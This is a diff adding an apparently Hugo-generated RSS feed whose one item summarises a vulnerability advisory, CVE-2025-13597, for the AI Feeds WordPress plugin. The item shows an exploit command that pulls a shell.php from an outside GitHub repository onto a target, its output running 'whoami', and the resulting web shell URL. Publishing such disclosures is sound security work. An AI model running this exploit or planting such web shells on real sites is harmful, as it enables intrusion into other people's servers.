@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>AI Feeds on </title>
+    <link>https://ryankozak.com/tags/ai-feeds/</link>
+    <description>Recent content in AI Feeds on </description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 25 Nov 2025 00:01:00 +0000</lastBuildDate>
+    <atom:link href="https://ryankozak.com/tags/ai-feeds/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>AI Feeds &lt;= 1.0.11 - Unauthenticated Arbitrary File Upload</title>
+      <link>https://ryankozak.com/posts/cve-2025-13597/</link>
+      <pubDate>Tue, 25 Nov 2025 00:01:00 +0000</pubDate>
+      <guid>https://ryankozak.com/posts/cve-2025-13597/</guid>
+      <description>&lt;h3 id=&#34;cve-2025-13597&#34;&gt;CVE-2025-13597&lt;/h3&gt;&#xA;&lt;p&gt;The &lt;a href=&#34;https://wordpress.org/plugins/ai-feeds/&#34; target=&#34;_blank&#34;&gt;AI Feeds&lt;/a&gt; WordPress plugin versions 1.0.11 and below contain an unauthenticated remote code execution vulnerability in the &lt;code&gt;actualizador_git.php&lt;/code&gt; file. This file is directly accessible via HTTP without any authentication or authorization checks, allowing unauthenticated attackers to download arbitrary GitHub repositories and overwrite plugin files, leading to remote code execution.&lt;/p&gt;&#xA;&lt;h2 id=&#34;tldr-exploits&#34;&gt;TL;DR Exploits&lt;/h2&gt;&#xA;&lt;p&gt;A &lt;a href=&#34;https://github.com/d0n601/CVE-2025-13597/blob/master/CVE-2025-13597.py&#34; target=&#34;_blank&#34;&gt;exploit.py&lt;/a&gt; is provided to demonstrate a remote attacker uploading &lt;code&gt;shell.php&lt;/code&gt; and executing remote code:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 CVE-2025-13597.py -t http://techcorp.cc -o d0n601 -r minimal-rce -k github_pat_YOURKEY -c whoami&#xA;[*] Exploiting actualizador_git.php vulnerability...&#xA;[*] Downloading and installing shell from GitHub repository: d0n601/minimal-rce&#xA;Descargando d0n601/minimal-rce@main ...&#xA;Eliminando entradas extra...&#xA;Copiando archivos...&#xA;OK. Mirror aplicado en: /var/www/html/wp-content/plugins/ai-feeds&#xA;&#xA;[*] Exploit executed. Checking if shell.php was created...&#xA;&#xA;[*] Testing shell access...&#xA;www-data&#xA;&#xA;&#xA;[*] Shell should be accessible at:&#xA;    http://techcorp.cc/wp-content/plugins/ai-feeds/shell.php?cmd=COMMAND&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;technical-analysis&#34;&gt;Technical Analysis&lt;/h2&gt;&#xA;&lt;p&gt;The vulnerability exists in &lt;code&gt;/wp-content/plugins/ai-feeds/actualizador_git.php&lt;/code&gt;. This file implements a GitHub repository mirroring system that can be accessed directly via HTTP without any security controls.&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
